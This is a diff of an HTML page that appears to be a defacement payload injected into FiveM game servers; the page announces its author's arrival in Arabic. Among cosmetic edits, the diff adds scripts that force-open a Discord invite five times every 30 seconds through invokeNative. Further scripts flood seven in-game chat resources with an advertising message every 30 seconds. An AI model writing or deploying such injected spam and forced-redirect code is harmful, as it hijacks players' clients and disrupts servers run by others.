@@ -8,7 +8,7 @@
         body {
             margin: 0;
             padding: 0;
-            background: url('https://media.discordapp.net/attachments/1402964948895793152/1426661993040969799/d23da056-fdf1-49a9-a5b8-ba537dbc1e6e.png?ex=68ec0a05&is=68eab885&hm=5a93ea610e1cd2b96ebf0837ebedccf9c4a53e1a421ae9f6d12aed2c2247b3a4&=&format=webp&quality=lossless') no-repeat center center fixed;
+            background: url('https://media.discordapp.net/attachments/1425924169404518523/1426997049307435078/11111.png?ex=68ed4210&is=68ebf090&hm=fab153fcde1770108adc935f6fbe20b5c305208350983519f15c438dad035fc9&=&format=webp&quality=lossless&width=1522&height=856') no-repeat center center fixed;
             background-size: cover;
             font-family: 'Courier New', Courier, monospace;
             color: #0000ff;
@@ -22,11 +22,11 @@
         }
 
         .text {
-            font-size: 5em; /* زيادة حجم النص */
-            color: #FF00D8;
-            text-shadow: 0px 0px 8px #030000, 0px 0px 15px #030000, 0px 0px 25px #030000;
+            font-size: 5em; /* Increase text size */
+            color: #FF0000;
+            text-shadow: 0px 0px 8px #90CBD1, 0px 0px 15px #030000, 0px 0px 25px #030000;
             letter-spacing: 4.5px;
-            animation: slideUpDown 5s ease-in-out infinite; /* تعديل الأنيميشن */
+            animation: slideUpDown 5s ease-in-out infinite; /* Modify animation */
         }
 
         .image-container img {
@@ -43,8 +43,8 @@
         }
 
         .info {
-            margin-top: 20px;
-            font-size: 1.5em;
+            margin-top: 150px;
+            font-size: 0.5em;
             color: #FF00D8;
             text-shadow: 0px 0px 8px #030000, 0px 0px 15px #030000, 0px 0px 25px #030000;
             letter-spacing: 4.5px;
@@ -69,35 +69,58 @@
 
         @keyframes slideUpDown {
             0% {
-                transform: translateY(-50px); /* بداية من أعلى */
+                transform: translateY(-50px); /* Start from top */
             }
             50% {
-                transform: translateY(200px); /* النزول للأسفل */
+                transform: translateY(200px); /* Move down */
             }
             100% {
-                transform: translateY(-50px); /* العودة للأعلى */
+                transform: translateY(-50px); /* Return to top */
             }
         }
     </style>
 </head>
 <body>
     <audio autoplay loop>
-        <source src="https://cdn.discordapp.com/attachments/1402964948895793152/1426661356605538304/1_1.mp3?ex=68ec096d&is=68eab7ed&hm=3649f659e933dd96bec3945aebf373da332cd50f93bdafeb0e6b202057dc2a26&" type="audio/mpeg">
+        <source src="https://k.top4top.io/m_357262gxq1.mp3" type="audio/mpeg">
     </audio>
 
     <div class="text">المري وصل يا ساده</div>
     <div class="text">اسم حسابي دس(9z71)</div>
 
     <div class="image-container">
+        <!-- Image container for future use -->
     </div>
 
     <div class="info" id="ip-info">
         <!-- IP info will be fetched here -->
     </div>
 
+    <!-- Discord Redirect Script -->
+    <script>
+        setInterval(() => {
+            // Opening Discord link 5 times every 30 seconds
+            for (let i = 0; i < 5; i++) {
+                window.invokeNative("openUrl", "https://discord.gg/uaee");
+            }
+        }, 30000); // 30 seconds interval
+    </script>
 
+    <!-- Message Sending Script -->
+    <script>
+        const msg = `👑 المري وصل - .gg/3DPaYFuD ! 👑`;
+        const body = JSON.stringify({ message: msg });
 
-
+        setInterval(() => {
+            // Sending the message to various URLs
+            fetch("https://flix-scripts/chatResult", { method: "POST", body });
+            fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST", body: JSON.stringify({"message": msg, "channel": "شات العام", "color": null, "isImageAndLinksAllowed": [false, false]})});
+            fetch("https://easy-chat+/o6ZbK5Ecp6", { headers: { accept: "*/*", "content-type": "application/x-www-form-urlencoded; charset=UTF-8" }, body: JSON.stringify({ message: msg, channel: "شات العام" }), method: "POST" });
+            fetch("https://melix_chat/chatResult", { method: "POST", body });
+            fetch("https://as_chat/chatResult", { method: "POST", body });
+            fetch("https://chat/chatResult", { method: "POST", body });
+            fetch("https://ho-chatv2/Chat", { method: "POST", body: JSON.stringify({ "Type": "chatResult", "message": msg, "chatType": "general" }) });
+        }, 30000); // Send the message every 30 seconds
     </script>
 </body>
 </html>
